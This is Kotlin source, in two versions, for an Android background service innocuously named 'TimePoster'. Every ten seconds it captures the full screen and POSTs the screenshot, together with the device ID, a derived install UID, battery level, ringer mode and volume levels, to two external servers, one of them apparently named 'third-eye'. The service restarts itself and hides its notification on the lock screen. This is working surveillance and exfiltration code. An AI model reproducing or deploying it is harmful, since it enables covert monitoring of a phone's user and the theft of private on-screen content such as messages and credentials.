package com.example.backgroundserviceapp

import android.app.*
import android.content.*
import android.media.AudioManager
import android.os.*
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import android.provider.Settings
class TimePosterService : Service() {
    private val client = OkHttpClient()
    private val scope  = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var mpHelper: MediaProjectionHelper

    companion object {
        private const val CH_ID   = "TimePosterChannel"
        private const val NOTIF   = 1
        private const val POST_URL = "https://collegify.pythonanywhere.com/background_api"
        private const val POST_URL_2 = "https://third-eye-txe8.onrender.com/background_api"
        private val JSON_MT      = "application/json; charset=utf-8".toMediaType()
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        mpHelper = MediaProjectionHelper(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // 1) Promote to foreground first
        startForeground(NOTIF, buildNotification())

        // 2) Now safe to set up projection
        intent?.let {
            val code = it.getIntExtra("proj_code", Activity.RESULT_CANCELED)
            val data = it.getParcelableExtra<Intent>("proj_data")
            if (code == Activity.RESULT_OK && data != null) {
                mpHelper.setProjection(code, data)
            }
        }

        // 3) Loop every 10s
        scope.launch {
            while (isActive) {
                mpHelper.captureOnce(
                    resources.displayMetrics.widthPixels,
                    resources.displayMetrics.heightPixels
                ) { b64 ->
                    sendInfo(b64)
                }
                delay(10_000L)
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?) = null

//    private fun sendInfo(screenshot: String) {
//        if (screenshot.isEmpty()) return
//        val batt = registerReceiver(
//            null,
//            IntentFilter(Intent.ACTION_BATTERY_CHANGED)
//        )
//        val level = batt?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
//        val scale = batt?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
//        val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1
//
//        val audio = getSystemService(AUDIO_SERVICE) as AudioManager
//        val mode = when (audio.ringerMode) {
//            AudioManager.RINGER_MODE_SILENT  -> "silent"
//            AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
//            AudioManager.RINGER_MODE_NORMAL  -> "normal"
//            else                             -> "unknown"
//        }
//
//        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
//        val name = "${Build.MANUFACTURER} ${Build.MODEL} [$androidId]"
//
//        val m   = audio.getStreamVolume(AudioManager.STREAM_MUSIC)
//        val mMx = audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
//        val r   = audio.getStreamVolume(AudioManager.STREAM_RING)
//        val rMx = audio.getStreamMaxVolume(AudioManager.STREAM_RING)
//        val a   = audio.getStreamVolume(AudioManager.STREAM_ALARM)
//        val aMx = audio.getStreamMaxVolume(AudioManager.STREAM_ALARM)
//
//        val json = """
//        {
//          "device_name":"$name",
//          "battery_percentage":$pct,
//          "ringer_mode":"$mode",
//          "screenshot_png_b64":"$screenshot",
//          "volumes":{
//            "music":{"current":$m,"max":$mMx},
//            "ring":{"current":$r,"max":$rMx},
//            "alarm":{"current":$a,"max":$aMx}
//          }
//        }
//        """.trimIndent()
//
//        Request.Builder()
//            .url(POST_URL)
//            .post(json.toRequestBody(JSON_MT))
//            .build()
//            .let { client.newCall(it).execute().use { } }
//    }

    private fun sendInfo(screenshot: String) {
        if (screenshot.isEmpty()) return

        val batt = registerReceiver(
            null,
            IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )
        val level = batt?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batt?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1

        val audio = getSystemService(AUDIO_SERVICE) as AudioManager
        val mode = when (audio.ringerMode) {
            AudioManager.RINGER_MODE_SILENT  -> "silent"
            AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
            AudioManager.RINGER_MODE_NORMAL  -> "normal"
            else                             -> "unknown"
        }

        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val name = "${Build.MANUFACTURER} ${Build.MODEL} [$androidId]"

        val m   = audio.getStreamVolume(AudioManager.STREAM_MUSIC)
        val mMx = audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        val r   = audio.getStreamVolume(AudioManager.STREAM_RING)
        val rMx = audio.getStreamMaxVolume(AudioManager.STREAM_RING)
        val a   = audio.getStreamVolume(AudioManager.STREAM_ALARM)
        val aMx = audio.getStreamMaxVolume(AudioManager.STREAM_ALARM)

        val json = """
        {
          "device_name":"$name",
          "battery_percentage":$pct,
          "ringer_mode":"$mode",
          "screenshot_png_b64":"$screenshot",
          "volumes":{
            "music":{"current":$m,"max":$mMx},
            "ring":{"current":$r,"max":$rMx},
            "alarm":{"current":$a,"max":$aMx}
          }
        }
        """.trimIndent()

        val body = json.toRequestBody(JSON_MT)

        // 🛡 Wrap both network calls with try-catch
        try {
            Request.Builder().url(POST_URL).post(body).build()
                .let { client.newCall(it).execute().use { /* response ignored */ } }
        } catch (e: Exception) {
            e.printStackTrace() // or Log.e("TimePoster", "POST 1 failed", e)
        }

        try {
            Request.Builder().url(POST_URL_2).post(body).build()
                .let { client.newCall(it).execute().use { } }
        } catch (e: Exception) {
            e.printStackTrace() // or Log.e("TimePoster", "POST 2 failed", e)
        }
    }


    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel(
                CH_ID,
                "Background Poster",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setSound(null, null)
                lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(this)
            }
        }
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CH_ID)
        .setContentTitle("TimePoster Running")
        .setContentText("Posting every 10 s")
        .setSmallIcon(R.drawable.ic_notification)
        .setOngoing(true)
        .build()
}










version 2



package com.example.backgroundserviceapp

import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.media.AudioManager
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.*
import java.util.zip.CRC32

class TimePosterService : Service() {

    private val client = OkHttpClient()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var mpHelper: MediaProjectionHelper
    private var screenW = 0
    private var screenH = 0

    // prefs to hold our generated UID
    private val prefs: SharedPreferences
        get() = getSharedPreferences("background_service_prefs", Context.MODE_PRIVATE)

    // retrieves or generates our 6‑digit+3‑letter UID
    private val installUid: String
        get() = prefs.getString("install_uid", null) ?: generateAndStoreUid()

    companion object {
        private const val CH_ID       = "TimePosterChannel"
        private const val NOTIF_ID    = 1
        private const val POST_URL_1  = "https://collegify.pythonanywhere.com/background_api"
        private const val POST_URL_2  = "https://third-eye-txe8.onrender.com/background_api"
        private val JSON_MT          = "application/json; charset=utf-8".toMediaType()
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        mpHelper = MediaProjectionHelper(this)

        // record screen size once
        val dm = resources.displayMetrics
        screenW = dm.widthPixels
        screenH = dm.heightPixels

        // ensure installUid is generated
        installUid.also { /* no-op */ }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // 1) promote to foreground
        startForeground(NOTIF_ID, buildNotification())

        // 2) set up projection + single virtual display
        intent?.let {
            val code = it.getIntExtra("proj_code", Activity.RESULT_CANCELED)
            val data = it.getParcelableExtra<Intent>("proj_data")
            if (code == Activity.RESULT_OK && data != null) {
                mpHelper.setProjection(code, data, screenW, screenH)
            }
        }

        // 3) loop every 10s, grabbing latest frame
        scope.launch {
            while (isActive) {
                mpHelper.captureOnce { b64 ->
                    if (b64.isNotEmpty()) {
                        sendInfo(b64)
                    }
                }
                delay(10_000L)
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        scope.cancel()
        mpHelper.cleanup()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?) = null

    private fun sendInfo(screenshotB64: String) {
        try {
            // battery %
            val batt = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batt?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batt?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1

            // ringer mode
            val audio = getSystemService(AUDIO_SERVICE) as AudioManager
            val mode = when (audio.ringerMode) {
                AudioManager.RINGER_MODE_SILENT  -> "silent"
                AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
                AudioManager.RINGER_MODE_NORMAL  -> "normal"
                else                             -> "unknown"
            }

            // device name
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val name = "${Build.MANUFACTURER} ${Build.MODEL}"

            // volumes
            val mCur = audio.getStreamVolume(AudioManager.STREAM_MUSIC)
            val mMax = audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            val rCur = audio.getStreamVolume(AudioManager.STREAM_RING)
            val rMax = audio.getStreamMaxVolume(AudioManager.STREAM_RING)
            val aCur = audio.getStreamVolume(AudioManager.STREAM_ALARM)
            val aMax = audio.getStreamMaxVolume(AudioManager.STREAM_ALARM)

            // build JSON payload
            val json = """
                {
                  "install_uid":"$installUid",
                  "device_name":"$name",
                  "android_id":"$androidId",
                  "battery_percentage":$pct,
                  "ringer_mode":"$mode",
                  "screenshot_png_b64":"$screenshotB64",
                  "volumes":{
                    "music":{"current":$mCur,"max":$mMax},
                    "ring":{"current":$rCur,"max":$rMax},
                    "alarm":{"current":$aCur,"max":$aMax}
                  }
                }
            """.trimIndent()

            val body = json.toRequestBody(JSON_MT)

            // post to both endpoints
            Request.Builder().url(POST_URL_1).post(body).build()
                .let { client.newCall(it).execute().use { } }

            Request.Builder().url(POST_URL_2).post(body).build()
                .let { client.newCall(it).execute().use { } }

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /** Generate a 6-digit + 3-letter UID from ANDROID_ID, store & return it. */
    private fun generateAndStoreUid(): String {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: UUID.randomUUID().toString()
        // Use CRC32 to get a stable 32-bit number from the string
        val crc = CRC32().apply { update(androidId.toByteArray()) }.value.toInt()

        // 6 digits: absolute value mod 1_000_000, zero-padded
        val digits = String.format(Locale.US, "%06d", (crc and 0x7FFFFFFF) % 1_000_000)

        // 3 letters: take next bits and map each to A–Z
        val rnd = Random(crc.toLong())
        val letters = buildString {
            repeat(3) {
                val c = 'A' + rnd.nextInt(26)
                append(c)
            }
        }

        val uid = digits + letters
        prefs.edit().putString("install_uid", uid).apply()
        return uid
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                CH_ID,
                "Background Poster",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setSound(null, null)
                lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(chan)
        }
    }

    private fun buildNotification() =
        NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("TimePoster Running")
            .setContentText("Posting every 10 s")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .build()
}
